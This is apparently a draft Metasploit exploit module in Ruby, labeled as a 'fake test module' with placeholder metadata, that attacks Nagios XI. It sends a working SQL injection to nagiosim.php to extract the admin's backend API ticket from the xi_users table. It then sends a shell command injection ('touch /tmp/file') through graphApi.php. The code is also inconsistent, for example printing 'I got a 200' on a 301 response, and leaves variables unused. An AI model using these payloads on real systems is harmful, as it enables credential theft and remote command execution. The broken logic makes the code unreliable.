##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Fake Test Module',
			'Description'    => %q{
				If this module loads, you know you're doing it right.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'todb'
				],
			'References'     =>
				[
					[ 'CVE', '1970-0001' ]
				],
			'Platform'          => [ 'linux' ],
			'Targets'        =>
				[
					['Universal', {}]
				],
			'DisclosureDate' => 'Jan 01 1970',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The output file name.', 'test.txt'])
			], self.class)

	end

	def exploit

		data = "Hello, world!\r\n"

		# Create the file
		print_status("Test File")
		run
	end

def run
	    print ("test")
            uri = target_uri.path

#            res = send_request_cgi({
#                'method'   => 'GET',
#                'uri'      => normalize_uri(uri, '/'),
#            })


        res =      send_request_raw({'uri'=>"/nagiosxi/includes/components/nagiosim/nagiosim.php?mode=resolve&host=a&service='+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT('|APIKEY|',(SELECT+MID((IFNULL(CAST(backend_ticket+AS+CHAR),0x20)),1,54)+FROM+xi_users+WHERE+user_id%3d1+LIMIT+0,1),'|APIKEY|',FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)+OR+'"})
            puts res.code
            apikeytoparse = res.body
            apikey = apikeytoparse.slice(5, 10) 
            puts apikey
            puts res.body
            if res && res.code == 301
                print_good("I got a 200, awesome")
            else
                print_error("No 200, feeling blue")
            end

		apitoken = Digest::MD5.hexdigest('7jge09hl')
		puts apitoken
        res2 =      send_request_raw({'uri'=>"/nagiosxi/includes/components/perfdata/graphApi.php?host=127.0.0.1&start=1;&end=touch /tmp/file"})
            puts res2.code
            apikeytoparse = res2.body
            apikeytoparse.slice(5, 10) 
            puts res2.body
            if res2 && res2.code == 301
                print_good("I got a 200, awesome")
            else
                print_error("No 200, feeling blue")
            end



        end



end
